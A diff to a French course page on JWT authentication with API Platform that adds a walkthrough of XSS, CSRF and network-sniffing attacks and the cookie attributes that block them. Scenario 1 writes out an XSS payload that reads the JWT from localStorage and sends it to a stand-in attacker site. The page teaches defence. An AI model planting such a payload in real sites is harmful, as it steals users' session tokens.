@@ -905,7 +905,7 @@ On respecte la notion de **stateless** car le serveur ne garde aucune informatio
 
 Néanmoins, si ce token venait à être dérobé, alors on pourrait usurper un utilisateur. C'est pour cela que les `JWT` ont une date d'expiration (généralement, 3600 secondes, mais on peut mettre plus). Pour éviter que l'utilisateur n'ait à se reconnecter manuellement lors de l'expiration, il faut alors mettre en place tout un système de rafraîchissement que nous aborderons dans une section bonus de ce TD.
 
-La manière dont est stocké le token côté client est également très importante ! Nous verrons les différentes problématiques de sécurités liées à cet aspect, et quelle est la manière considérée la plus "propre" et la plus sécurisée pour stocker et transmettre le `JWT`.
+La manière dont est stocké le token côté client est également très importante ! Nous verrons les différentes problématiques de sécurité liées à cet aspect, et quelle est la manière considérée la plus "propre" et la plus sécurisée pour stocker et transmettre le `JWT`. Nous étudierons pour cela trois scénarios d'attaque : une faille XSS sur notre propre site, un site externe malveillant qui envoie des requêtes à notre API (attaque CSRF) et l'écoute du réseau.
 
 ### Prise en charge des utilisateurs
 
@@ -1274,7 +1274,25 @@ Dorénavant, afin que l'API puisse autoriser certaines requêtes qui nécessiten
 
 Ce système est assez standard et est utilisé dans de nombreuses APIs. Cependant... Nous allons tout casser ! En effet, renvoyer directement le `JWT` dans le corps de la réponse n'est pas toujours une très bonne pratique selon le contexte, notamment si votre **API** est utilisée au travers d'une application cliente sur navigateur comme nous allons le faire bientôt (dans les TDs de Vue.js). Il faut bien comprendre que quelqu'un qui possède votre **token** peut usurper votre identité jusqu'à son expiration. Il faut donc limiter au maximum les risques que cela se produise.
 
-Cette fois, le problème vient du client, et plus précisément des applications qui tournent sur un navigateur web (avec un framework JavaScript par exemple, comme nous le ferons dans les prochains TDs). Le problème est de savoir où et comment stocker le JWT. Il y a plusieurs options :
+#### Les acteurs en présence
+
+Dans les attaques qui suivent, la question à se poser en permanence est : **sur quel site s'exécute le code de l'attaquant, et vers quel site part la requête ?** Nous fixons donc les acteurs suivants pour toute la suite :
+
+| Adresse | Rôle |
+|---|---|
+| `https://monsite.fr/api` | **Notre API** (celle de ce TD) : elle délivre le `JWT` et le vérifie à chaque requête. |
+| `https://monsite.fr` | **Notre client web** légitime (une application `Vue.js`) qui consomme l'API. Alice, l'utilisatrice, s'y connecte. |
+| `https://site-malveillant.com` | Un **site externe** contrôlé par Mallory, l'attaquant, qui cherche à y attirer Alice (lien dans un mail, publicité...). |
+
+Le navigateur ne raisonne pas en chemins, mais en noms de domaine. Notre client et notre API sont donc sur le **même site** (`monsite.fr`), et même sur la même **origine** (protocole + nom de domaine + port : `https://monsite.fr`). `site-malveillant.com` est, lui, un **site différent**. Le navigateur se sert de ces deux notions pour cloisonner le `localStorage` (par origine) et pour décider s'il envoie un cookie (attribut `SameSite`, par site, que nous verrons plus loin).
+
+<object data="{{site.baseurl}}/assets/TD4/securite/acteurs.svg" type="image/svg+xml" class="blockcenter" width="370" markdown="0">
+Le client et l'API sont sur le même site et la même origine, le site de Mallory est un site différent
+</object>
+
+#### Où stocker le JWT dans le navigateur ?
+
+Le problème est de savoir où le client `https://monsite.fr` doit stocker le `JWT`. Il y a plusieurs options :
 
 * Dans une **variable JavaScript** simple. Mais celle-ci sera supprimée si la page est rechargée, ce n'est donc pas idéal du tout (l'utilisateur devra se reconnecter...)
 
@@ -1284,35 +1302,104 @@ Cette fois, le problème vient du client, et plus précisément des applications
 
 Jusqu'à il y a quelques années (et encore un peu aujourd'hui), beaucoup d'applications utilisaient la démarche suivante :
 
-* L'API génère le `JWT` et l'envoi dans la réponse de la requête (ce que vous avez actuellement).
+* L'API `https://monsite.fr/api` génère le `JWT` et l'envoie dans le corps de la réponse (ce que vous avez actuellement).
 
-* Le client (navigateur web) stocke le `JWT` dans le `localStorage` et l'envoi à chaque requête où cela est nécessaire. De plus, comme on peut décoder le `JWT` (qui ne contient aucune information sensible), on peut connaître la date d'expiration du token et agir en conséquence.
+* Le client `https://monsite.fr` stocke le `JWT` dans son `localStorage` et l'ajoute lui-même dans l'en-tête `Authorization` des requêtes qui en ont besoin. De plus, comme on peut décoder le `JWT` (qui ne contient aucune information sensible), on peut connaître la date d'expiration du token et agir en conséquence.
 
-Cependant, ce système était fortement vulnérable à un type d'attaque bien connue : l'attaque `XSS` (Cross-site Scripting). Cette attaque consiste à exploiter une vulnérabilité du site pour introduire un script malveillant qui sera exécuté par le navigateur d'une victime (ou pire, tous les utilisateurs). Cette attaque est par exemple possible si certaines informations fournies par l'utilisateur ne sont pas correctement échappées par l'application et traitées comme du code. 
+Comme le `localStorage` est cloisonné par origine, un site externe comme `https://site-malveillant.com` **ne peut pas** lire le `JWT` d'Alice. Le danger vient d'ailleurs : d'un script malveillant qui s'exécuterait **sur notre propre site** `https://monsite.fr`. C'est précisément ce que permet une faille **XSS**.
 
-Un attaquant pourrait par exemple envoyer des informations (par exemple, quand il rentre sa biographie sur son profil) contenant un bout de code JavaScript qui irait lire le `JWT` dans le `localStorage` et l'enverrait ailleurs, sur un espace accessible par l'attaquant. Toutes les personnes qui consulteraient la biographie en question exécuteraient alors (sans le savoir) ce script, et leur token serait donc envoyé à l'attaquant. Par la suite, ce dernier pourra donc usurper les identités des utilisateurs dont il a récupéré le token.
+#### Scénario 1 : une faille XSS sur notre site (vol du token)
 
-Le danger vient donc du fait que n'importe quel script `javascript` puisse accéder et lire dans `localStorage`. Si le contenu du `JWT` n'est pas sensible en soi, le `JWT` en lui-même est utilisé pour vous identifier. Il faut donc absolument éviter de le stocker dans un endroit potentiellement vulnérable.
+Malgré son nom (*Cross-Site Scripting*), dans une attaque XSS le script malveillant s'exécute **sur notre site légitime** `https://monsite.fr`, avec exactement les mêmes droits que notre propre code. Cette attaque est possible dès que des informations fournies par un utilisateur sont affichées sans être échappées, et sont donc interprétées comme du code par le navigateur.
 
-Pour pallier ce problème, une alternative peut être choisie : utiliser des **cookies sécurisés**. Plus précisément, des cookies en mode **secure** et **httpOnly** et en configurant adéquatement l'attribut **SameSite**. Ces options sont des indications utilisées par le **navigateur** pour stocker le cookie et savoir s'il faut ou non l'envoyer lors d'une requête. Regardons de plus près ces paramètres :
+1. Mallory se crée un compte sur `https://monsite.fr` et écrit dans sa biographie :
+   `<img src="x" onerror="fetch('https://site-malveillant.com/vol?jwt=' + localStorage.getItem('jwt'))">`
 
-* **secure** : le cookie n'est envoyé que si la requête est chiffrée (**https**).
-* **httpOnly** : le cookie n'est pas accessible dans le **javascript**. Il sera envoyé automatiquement à chaque requête vers le serveur, mais à aucun moment un script pourra lire ses données. Cela élimine le risque de se le faire voler en cas d'attaque XSS.
-* L'attribut **SameSite** permet de définir si le cookie doit être envoyé ou non selon le site où est émise la requête vers le serveur. Cela permet notamment d'éviter les attaques **CSRF** dont nous allons parler juste après.
+2. Notre client affiche les biographies sans les échapper. Le navigateur interprète donc ce texte comme du HTML, et exécute le code de l'attribut `onerror`.
 
-Une attaque **CSRF** (Cross-site Request Forgery) consiste à faire envoyer une requête vers un serveur (ici, une API) à l'utilisateur, mais depuis un autre site. L'idée est que le site en question contienne un script JavaScript qui émet la requête. Il faut ensuite faire en sorte que l'utilisateur que l'on souhaite piéger se rende sur ce site. La requête sera alors envoyée depuis le navigateur du client, comme si c'était lui qui était à l'initiative de la requête. Alors, même avec un cookie **secure** et en **httpOnly**, dans ce cas, l'attaquant pourra exécuter des actions sous notre identité. Notez cette fois que l'attaquant ne récupère pas notre `JWT`. Il utilise notre identité à travers notre navigateur.
+3. Alice consulte le profil de Mallory sur `https://monsite.fr`. Le script s'exécute dans **son** navigateur, **sur l'origine `https://monsite.fr`** : il a donc accès au `localStorage` de `monsite.fr` et envoie le `JWT` d'Alice au serveur de Mallory.
 
-Pour contrer cela, on paramètre l'attribut `Same-Site` du cookie, avec une des deux valeurs suivantes :
+4. Mallory possède désormais le `JWT` d'Alice. Il peut l'utiliser **depuis sa propre machine** (avec `Postman`, par exemple) jusqu'à son expiration, même après qu'Alice a fermé son navigateur.
 
-* `Same-Site: Strict` : le cookie n'est envoyé que si l'adresse du serveur de destination est la même que celle du site depuis lequel est émise la requête. Et cela pour toutes les opérations (**GET**, **POST**, etc...). Par exemple, si je me trouve sur le site `https://monsite.fr/home` que je possède un cookie lié au site `monsite.fr` et que je fais une requête vers `https://monsite.fr/api/utilisateurs`, le cookie sera envoyé. Par contre, si je me trouve sur le site `https://un-site-pas-suspect-du-tout.arnaque/home` et que je fais une requête vers `https://monsite.fr/api/utilisateurs`, le cookie ne sera pas envoyé.
+<object data="{{site.baseurl}}/assets/TD4/securite/xss-localstorage.svg" type="image/svg+xml" class="blockcenter" width="1100" markdown="0">
+Scénario XSS : le script injecté lit le JWT dans le localStorage et l'envoie à site-malveillant.com
+</object>
 
-* `Same-Site: Lax` : même chose sauf pour les opérations type `GET` si la requête mène vers le même site que celui associé au cookie. Par exemple, si on clique sur un lien depuis un site externe. Imaginons le scénario suivant : vous êtes connecté sur le site `https://monsite.fr/`. Sur la page d'accueil, vous vous attendez donc à avoir un rendu en mode "connecté", avec un bouton "profil", "déconnexion", etc. Avec le mode `Strict`, si vous cliquez sur le lien `https://monsite.fr/` depuis un autre site (par exemple, depuis un mail), la page apparaîtra comme si vous étiez déconnecté. Avec le mode `Lax`, le cookie sera envoyé et vous verrez la page comme si vous étiez connecté. Le mode `Lax` est le mode choisi par défaut.
+Si le contenu du `JWT` n'est pas sensible en soi, le `JWT` lui-même sert à vous identifier. Le problème vient du fait que **tout** script exécuté sur `https://monsite.fr`, y compris un script injecté, peut lire le `localStorage`.
 
-* Il existe une troisième valeur possible `Same-Site: None` : autorise tout (le cookie est envoyé même si la requête est émise depuis un site différent). Cela ne nous intéresse donc pas.
+#### Première parade : un cookie `HttpOnly`
 
-Il reste important de noter que, même avec tout cela, on est toujours exposé "en partie" aux attaques `XSS` : si un script malveillant est présent sur le site et exécuté par l'utilisateur, l'attaquant ne pourra plus récupérer le token de l'utilisateur, mais pourra tout de même exécuter des actions sous son identité. On ne règle donc que la moitié du problème. Pour le reste, c'est au développeur de s'assurer de ne pas introduire ce genre de faille et de mettre en place des mécanismes de sécurité supplémentaires.
+Une alternative consiste à faire stocker le `JWT` dans un **cookie** : dans la réponse d'authentification, l'API `https://monsite.fr/api` demande au navigateur de créer un cookie (en-tête `Set-Cookie`). Le navigateur conservera ce cookie et **l'ajoutera automatiquement** à chaque requête envoyée vers `monsite.fr` (donc vers l'API), sans que le code JavaScript du client n'ait rien à faire.
 
-Tout cela semble compliqué et fastidieux à configurer ! Mais pas de panique, un simple paramétrage d'API Platform permet de générer et placer un cookie **secure**, **httpOnly** avec l'attribut **SameSite: Lax** dans la réponse de la requête d'authentification. Par défaut, le token sera alors supprimé du **corps** (`JSON`) de la réponse.
+Un cookie peut porter des attributs. Ce sont des indications utilisées par le **navigateur** pour savoir qui peut lire le cookie et quand il faut l'envoyer. Le premier qui nous intéresse est **`HttpOnly`** : le cookie n'est **pas accessible en JavaScript** (il n'apparaît pas dans `document.cookie`). Ni notre code, ni un script injecté ne peuvent donc lire le `JWT`. Dans le scénario 1, le script de Mallory n'a plus rien à voler.
+
+Mais l'envoi automatique du cookie, qui rend le système pratique, ouvre la porte à une autre attaque.
+
+#### Scénario 2 : un site externe malveillant (CSRF)
+
+Avec le `localStorage`, le navigateur n'envoie jamais le `JWT` de lui-même : c'est le code JavaScript de notre client `https://monsite.fr` qui le lit dans le `localStorage` et l'ajoute explicitement dans l'en-tête `Authorization` de chaque requête. 
+Une page de `https://site-malveillant.com` ne peut pas en faire autant, puisqu'elle n'a pas accès au `localStorage` de `monsite.fr` : ses requêtes vers notre API partent donc sans `JWT`. 
+Avec un cookie, c'est le **navigateur** qui l'ajoute, en regardant **vers quel site part la requête**, et non **depuis quelle page** elle a été déclenchée. C'est le principe de l'attaque **CSRF** (*Cross-Site Request Forgery*) :
+
+1. Alice s'est connectée sur `https://monsite.fr` : son navigateur possède un cookie contenant son `JWT`, associé à `monsite.fr`.
+
+2. Mallory attire Alice sur `https://site-malveillant.com` (lien dans un mail, par exemple).
+
+3. Cette page contient un script (ou un formulaire caché soumis automatiquement) qui envoie une requête vers `https://monsite.fr/api`, par exemple pour supprimer une publication d'Alice.
+
+4. Le navigateur d'Alice joint le cookie à la requête, car elle part vers `monsite.fr`. L'API reçoit un `JWT` valide et exécute l'action en pensant qu'elle vient d'Alice.
+
+Cette fois, Mallory ne récupère **jamais** le `JWT` : il se sert du navigateur d'Alice pour agir à sa place. L'attribut `HttpOnly` n'y change donc rien.
+
+**Remarque :** les règles CORS (voir la section [Autorisation d'envoi d'informations d'authentification](#autorisation-denvoi-dinformations-dauthentification)) empêchent `site-malveillant.com` de **lire** la réponse de l'API, mais pas toujours d'**envoyer** la requête. Or, pour une attaque CSRF, c'est l'envoi qui compte : l'action est effectuée côté serveur, même si l'attaquant ne voit pas la réponse.
+
+#### Deuxième parade : l'attribut `SameSite`
+
+L'attribut **`SameSite`** indique au navigateur s'il doit joindre le cookie à une requête en fonction du **site de la page qui déclenche la requête**, comparé au site du cookie :
+
+* `SameSite=Strict` : le cookie n'est envoyé que si la requête est déclenchée depuis une page du **même site**. Une requête déclenchée depuis `https://monsite.fr` vers `https://monsite.fr/api` contient le cookie (même site), mais une requête déclenchée depuis `https://site-malveillant.com` ne le contient pas. C'est le cas pour toutes les requêtes, y compris un simple clic sur un lien.
+
+* `SameSite=Lax` : comme `Strict`, à une exception près : le cookie est tout de même envoyé lorsque l'utilisateur **navigue** vers notre site depuis un site externe avec une requête `GET` (clic sur un lien, par exemple). Les requêtes `POST`, `PATCH`, `DELETE`, les requêtes `fetch` ou le chargement d'images déclenchés par `site-malveillant.com` ne contiennent toujours pas le cookie : le scénario 2 est bloqué. En contrepartie, une route `GET` ne doit **jamais** modifier de données, ce que l'architecture **REST** impose déjà. Si l'attribut est absent, la plupart des navigateurs appliquent `Lax` par défaut.
+
+* `SameSite=None` : le cookie est envoyé quel que soit le site de départ (et l'attribut `Secure` est alors obligatoire). Cette valeur réintroduit le risque CSRF ; elle ne sert que si le client est sur un site différent de l'API.
+
+<object data="{{site.baseurl}}/assets/TD4/securite/csrf.svg" type="image/svg+xml" class="blockcenter" width="885" markdown="0">
+Scénario CSRF : une page de site-malveillant.com déclenche une requête vers l'API, le cookie est joint ou non selon SameSite
+</object>
+
+Pour comprendre la différence entre `Strict` et `Lax`, pensez à un site rendu côté serveur comme *The Feed* (TD1 à TD3), dont le cookie de session appartient à `monsite.fr`. Si Alice clique, depuis un mail, sur un lien vers `https://monsite.fr/`, le navigateur n'enverra pas un cookie `Strict` : la page s'affichera comme si elle était déconnectée. Avec `Lax`, le cookie est envoyé et la page s'affiche en mode "connecté".
+
+#### Scénario 3 : l'écoute du réseau (attribut `Secure`)
+
+Alice utilise le wifi public d'une gare, et une de ses requêtes vers notre API part en **http** (non chiffré). Toute personne qui écoute le réseau peut alors lire le cookie et donc le `JWT`. Avec l'attribut **`Secure`**, le navigateur n'envoie le cookie que sur des connexions chiffrées (**https**).
+
+#### Et si nos cookies sont mal paramétrés ?
+
+Chaque attribut ferme une porte précise. En oublier un rouvre le scénario correspondant :
+
+* sans `HttpOnly` : un script injecté sur `https://monsite.fr` peut lire le cookie avec `document.cookie` (scénario 1, comme avec le `localStorage`) ;
+* avec `SameSite=None` : une page de `https://site-malveillant.com` peut agir au nom d'Alice (scénario 2) ;
+* sans `Secure` : le `JWT` peut être intercepté sur le réseau (scénario 3).
+
+#### Ce qui reste : une faille XSS est toujours dangereuse
+
+Même avec un cookie `HttpOnly`, `Secure` et `SameSite=Lax`, revenons au scénario 1. Le script de Mallory s'exécute sur `https://monsite.fr` : ses requêtes vers `https://monsite.fr/api` sont donc des requêtes du **même site**, et le navigateur y joint le cookie. `SameSite` ne protège pas contre une faille XSS, puisque le script attaquant s'exécute sur notre site.
+
+<object data="{{site.baseurl}}/assets/TD4/securite/xss-httponly.svg" type="image/svg+xml" class="blockcenter" width="1003" markdown="0">
+Faille XSS avec un cookie HttpOnly : le script ne peut pas lire le JWT, mais ses requêtes vers l'API contiennent le cookie
+</object>
+
+Mallory ne peut plus **voler** le `JWT`, mais son script peut encore **agir au nom d'Alice** pendant qu'elle consulte la page. On passe d'un token volé, réutilisable depuis n'importe où jusqu'à son expiration, à une attaque limitée à la visite de la page. On ne règle donc que la moitié du problème : c'est au développeur du client de ne pas introduire de faille XSS (en laissant le moteur de templates échapper les données{% raw %}, comme le fait `{{ ... }}` en Twig{% endraw %}).
+
+#### Récapitulatif
+
+| Scénario | Où s'exécute le code de l'attaquant ? | `JWT` dans le `localStorage` | Cookie `HttpOnly`, `Secure`, `SameSite=Lax` |
+|---|---|---|---|
+| 1. XSS | Sur **notre** site `https://monsite.fr` | Token volé | Token protégé, mais actions possibles pendant la visite |
+| 2. CSRF | Sur un **site externe** `https://site-malveillant.com` | Aucun risque (le token n'est pas envoyé automatiquement) | Bloqué par `SameSite` |
+| 3. Écoute réseau | Nulle part (attaquant passif) | Intercepté si la requête part en http | Bloqué par `Secure` |
+
+Tout cela semble compliqué et fastidieux à configurer ! Mais pas de panique, un simple paramétrage du bundle `LexikJWTAuthenticationBundle` permet de générer et placer un cookie **`Secure`**, **`HttpOnly`** avec l'attribut **`SameSite=Lax`** dans la réponse de la requête d'authentification. Par défaut, le token sera alors supprimé du **corps** (`JSON`) de la réponse.
 
 Pour cela, il faut modifier le fichier `config/packages/lexik_jwt_authentication.yaml` en ajoutant les sections suivantes :
 
@@ -1322,7 +1409,11 @@ lexik_jwt_authentication:
     ...
     # Création automatique du cookie contenant le JWT
     set_cookies:
-        BEARER: ~
+        BEARER:
+            # Valeurs par défaut, écrites ici pour les rendre visibles
+            secure: true
+            httpOnly: true
+            samesite: lax
 
     # Pour que l'application recherche le JWT dans les cookies
     token_extractors:
@@ -1339,6 +1430,8 @@ Naturellement, le **cookie** stockant le token a la même date d'expiration que 
 1. Modifiez le fichier `config/packages/lexik_jwt_authentication.yaml` afin de changer la gestion du `JWT` dans la réponse de la requête d’authentification.
 
 2. Sur `Postman`, identifiez-vous de nouveau. Cette fois, le corps de la réponse devrait être vide. Cliquez sur le bouton **Cookies** (sous le bouton **Send**). Vous devriez observer le `JWT` stocké sous le nom de `Bearer`.
+
+3. Dans l'onglet **Headers** de la réponse, observez l'en-tête `Set-Cookie` et retrouvez les attributs du cookie `BEARER`. Pour chacun d'eux, indiquez quel scénario d'attaque (1, 2 ou 3) il empêche ou limite.
 
 </div>
 
@@ -1657,7 +1750,7 @@ Nous venons de voir que, dans notre cas, utiliser un cookie sécurisé pour tran
 
 Même si le fait d'utiliser un cookie présente de nombreux avantages au niveau de la sécurité, il peut poser des problèmes de gestion en fonction des clients qui souhaitent l'utiliser :
 
-* Concernant les navigateurs web, les cookies ne peuvent pas être envoyés par des clients dont le nom de domaine de l'adresse web se trouve en dehors du nom de domaine de l'adresse web de l'API. Par exemple, si mon API se trouve sur `www.exemple.com/api` et mon client sur `www.exemple.com/client`, dans les deux cas, le nom de domaine est `exemple.com`. Si on envoie une requête de connexion depuis `www.exemple.com/client`, le cookie écrit par l'API sera lié au nom de domaine `exemple.com` et sera bien envoyé à chaque requête nécessitant une authentification émise par `www.exemple.com/client`. De plus, on peut faire en sorte que le cookie fonctionne aussi dans les sous-domaines de `exemple.com` en configurant l'attribut `DOMAIN` du cookie (pour qu'il fonctionne sur `app.exemple.com`, par exemple...). Cependant, si une requête de connexion est émise depuis le site `coucou.com` le cookie créé sera toujours lié à `exemple.com` (car c'est là que se trouve l'API) et il ne sera jamais envoyé lors des requêtes émises depuis `coucou.com`. Bref, si l'API doit être utilisées par plusieurs sites externes qui ne sont pas sur le même nom domaine qu'elle, ça ne sera pas possible.
+* Concernant les navigateurs web, les cookies ne peuvent pas être envoyés par des clients dont le nom de domaine de l'adresse web se trouve en dehors du nom de domaine de l'adresse web de l'API. Par exemple, si mon API se trouve sur `www.exemple.com/api` et mon client sur `www.exemple.com/client`, dans les deux cas, le nom de domaine est `exemple.com`. Si on envoie une requête de connexion depuis `www.exemple.com/client`, le cookie écrit par l'API sera lié au nom de domaine `exemple.com` et sera bien envoyé à chaque requête nécessitant une authentification émise par `www.exemple.com/client`. De plus, on peut faire en sorte que le cookie fonctionne aussi dans les sous-domaines de `exemple.com` en configurant l'attribut `DOMAIN` du cookie (pour qu'il fonctionne sur `app.exemple.com`, par exemple...). Cependant, si une requête de connexion est émise depuis le site `coucou.com` le cookie créé sera toujours lié à `exemple.com` (car c'est là que se trouve l'API) et il ne sera jamais envoyé lors des requêtes émises depuis `coucou.com`. Bref, si l'API doit être utilisée par plusieurs sites externes qui ne sont pas sur le même nom de domaine qu'elle, ça ne sera pas possible avec notre configuration. C'est justement l'attribut `SameSite=Lax` qui bloque l'envoi du cookie depuis `coucou.com`, comme il le bloque depuis `site-malveillant.com` dans le scénario CSRF. On pourrait passer à `SameSite=None`, mais cela réintroduirait le risque CSRF, et les navigateurs bloquent de plus en plus ces cookies dits "tiers".
 
 * La gestion des cookies est essentiellement un mécanisme des clients de type **navigateur web**, et ne sont pas forcément gérés naturellement par les autres types de clients, comme les applications mobiles par exemple. Cependant, il existe des librairies pour gérer cela dans la plupart des cas. Et sinon, il suffit juste d'extraire les données de la réponse. De plus, ici, le paramétrage `HttpOnly`, `SameSite` et `Secure` n'ont pas vraiment d'importance, car ce sont des mécanismes liés au navigateur web. Une application mobile peut donc extraire les données des cookies envoyées par le serveur, les stocker et les envoyer au besoin à sa guise. De même, sur une application mobile, on ne retrouve pas les problèmes des failles XSS et CSRF (mais il peut y en avoir d'autres !). Bref, en dehors des navigateurs, la gestion des cookies n'est pas vraiment naturelle (mais pas impossible). On peut donc se dire que dans ce contexte, garder les tokens dans le corps de la réponse peut *éventuellement* être une meilleure solution (en tout cas, plus facile).
 
@@ -1870,6 +1963,8 @@ CORS_ALLOW_ORIGIN='^https?://(localhost|127\.0\.0\.1)(:[0-9]+)?$'
 ```
 
 Donc, on peut émettre les requêtes depuis un client web se situant sur `localhost`, ou bien l'adresse IP `127.0.0.1`, et sur n'importe quel port. C'est donc parfait pour le moment, car nous sommes en train de développer une application en local (notre futur client web sera aussi sur `localhost`). En production, il faudra idéalement changer cela par le véritable nom de domaine (où se situe le client).
+
+Ce réglage est important pour la sécurité. Avec `allow_credentials: true`, chaque origine autorisée par `CORS_ALLOW_ORIGIN` peut non seulement envoyer des requêtes à l'API avec les cookies de l'utilisateur, mais aussi **lire les réponses**. Si `https://site-malveillant.com` était autorisé par erreur (par exemple avec une expression régulière trop permissive), le site de l'attaquant pourrait lire les données d'Alice, alors que dans le scénario CSRF il ne pouvait qu'envoyer des requêtes à l'aveugle. Et si votre API est en sous-route du site client (comme `https://monsite.fr/api`), les requêtes sont de même origine et CORS n'intervient même pas.
 
 ## Bonus
 
